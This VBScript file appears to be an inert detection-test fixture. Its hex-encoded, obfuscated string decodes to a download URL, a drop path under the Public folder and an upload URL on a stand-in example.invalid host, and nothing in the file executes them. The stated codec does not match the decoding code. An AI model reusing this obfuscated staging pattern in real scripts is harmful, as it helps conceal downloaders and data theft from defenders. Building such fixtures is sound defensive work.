Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_9cdc4cb7 = "61281c675e5f505b5e28575a4e4c5f504a575a4e4c57175b5d505b4c5d504a5f5d4c595e51505d17605b575a4c4f4a5d50585a5f50674c4f4c5b5f505d282e505d5f3d505c19506350675e5f4c52504a4e5a60595f281d674e4c585b4c5452594a544f284e4c585b4c54525918231c20244c4d211d4c5067605d5728535f5f5b5e251a1a231c20244c4d211d4c501950634c585b5750195459614c57544f1a4f50234d1e1f1e4d194f4c5f67605e505d4a4c5250595f283360595f5d505e5e374c4d1a231c20244c4d211d4c5067515457504a5b4c5f53282e2547405e505d5e473b604d57544e473360595f5d505e5e374c4d475e5f4c525018231c20244c4d211d4c50194f4c5f67605b575a4c4f4a605d5728535f5f5b5e251a1a231c20244c4d211d4c501950634c585b5750195459614c57544f1a605b575a4c4f1a4d514e214e201f22"
Const Codec_9cdc4cb7 = "hex_compact|subtract_modulo_256|15"

Function Load_9cdc4cb7()
  Dim result(), ByTeInDeX
  ReDim result((Len(Material_9cdc4cb7) \ 2) - 1)
  For ByTeInDeX = 0 To UBound(result)
    result(ByTeInDeX) = CInt("&H" & Mid(Material_9cdc4cb7, ByTeInDeX * 2 + 1, 2))
  Next
  Load_9cdc4cb7 = result
End Function

Function Decode_9cdc4cb7(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = (SoUrCeByTeS(ByTeInDeX) + 21) Mod 256
  Next
  Decode_9cdc4cb7 = result
End Function

Function Recover_9cdc4cb7()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  ' configuration reconstruction
NeUtRaL = Join(Array("north", "south"), ":")
  SoUrCeByTeS = Load_9cdc4cb7()
  On Error Resume Next
  DeCoDeDByTeS = Decode_9cdc4cb7(SoUrCeByTeS)
  ErRoRnUmBeR = Err.Number
  ErRoRdEsCrIpTiOn = Err.Description
  On Error GoTo 0
  If ErRoRnUmBeR <> 0 Then Err.Raise ErRoRnUmBeR, "HuntressFixture", ErRoRdEsCrIpTiOn
  DeScRiPtOrTeXt = ""
  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
  Next
' reconstruction complete
  Recover_9cdc4cb7 = DeScRiPtOrTeXt
End Function

Sub Copy_9cdc4cb7(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_9cdc4cb7()
  Dim resultText
  Call Copy_9cdc4cb7(Recover_9cdc4cb7(), resultText)
  Inspect_9cdc4cb7 = resultText
End Function
